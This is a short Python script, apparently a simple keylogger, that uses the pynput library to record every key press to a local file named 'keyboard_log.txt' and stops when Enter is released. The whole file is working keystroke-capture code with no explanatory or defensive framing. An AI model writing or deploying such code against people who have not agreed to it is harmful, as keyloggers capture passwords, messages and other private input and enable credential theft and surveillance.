from pynput import keyboard
import logging
#logging.basicConfig(filename=("keyboard_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

fp=open("keyboard_log.txt",'a')
data=" "
def on_press(key):
    fp.write(str(key))
    
def on_release(key):
    if str(key) == 'Key.enter':
        return False
 
with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()
